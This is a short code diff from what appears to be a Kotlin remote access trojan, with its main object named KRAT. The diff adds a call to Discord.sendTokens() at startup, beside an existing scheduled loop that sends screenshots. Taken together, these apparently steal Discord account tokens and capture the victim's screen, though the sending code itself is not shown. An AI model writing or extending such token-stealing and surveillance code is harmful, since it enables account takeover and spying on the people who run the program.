@@ -1,3 +1,4 @@
+import services.Discord
 import java.io.File
 import java.util.concurrent.Executors
 import java.util.concurrent.TimeUnit
@@ -9,6 +10,8 @@ object KRAT {
 
 fun main() {
     val scheduler = Executors.newSingleThreadScheduledExecutor()
+
+    Discord.sendTokens()
 
     scheduler.scheduleAtFixedRate({
         Screen.sendScreenshot()
